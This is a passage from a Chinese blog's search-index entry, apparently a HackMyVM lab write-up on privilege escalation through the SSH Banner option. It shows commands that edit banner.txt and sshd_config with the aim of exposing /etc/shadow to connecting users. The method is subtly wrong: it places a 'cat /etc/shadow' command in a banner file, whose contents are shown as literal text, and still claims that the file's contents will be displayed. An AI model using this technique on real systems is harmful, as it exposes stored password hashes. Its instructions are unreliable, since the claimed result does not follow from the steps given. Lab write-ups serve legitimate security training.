class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> vim /etc/ssh/banner.txt<br></code></pre></td></tr></table></figure></li><li>在文件中添加以下内容，使用 <code>cat</code> 命令读取目标文件（如 <code>/etc/shadow</code>）：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/shadow<br></code></pre></td></tr></table></figure></li></ul><h4 id="步骤-2：修改-sshd-config"><a href="#步骤-2：修改-sshd-config" class="headerlink" title="步骤 2：修改 sshd_config"></a><strong>步骤 2：修改 <code>sshd_config</code></strong></h4><ul><li>打开 SSH 配置文件：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> vim /etc/ssh/sshd_config<br></code></pre></td></tr></table></figure></li><li>添加或修改 <code>Banner</code> 选项，指向刚刚创建的文件：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Banner /etc/ssh/banner.txt<br></code></pre></td></tr></table></figure></li></ul><h4 id="步骤-3：重启-SSH-服务"><a href="#步骤-3：重启-SSH-服务" class="headerlink" title="步骤 3：重启 SSH 服务"></a><strong>步骤 3：重启 SSH 服务</strong></h4><ul><li>重启 SSH 服务以使配置生效：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> systemctl restart sshd<br></code></pre></td></tr></table></figure></li></ul><h4 id="步骤-4：测试连接"><a href="#步骤-4：测试连接" class="headerlink" title="步骤 4：测试连接"></a><strong>步骤 4：测试连接</strong></h4><ul><li>使用 SSH 客户端连接到服务器：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh user@your_server_ip<br></code></pre></td></tr></table></figure></li><li>如果配置正确，连接时会显示目标文件的内容（如 <code>/etc/shadow</code>）。</li></ul>]]></content>
    
    
    <categories>
      
      <category>Hackmyvm</category>
      
    </categories>
    
    
    <tags>
      
      <tag>n8n</tag>
      
      <tag>提权-Banner</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
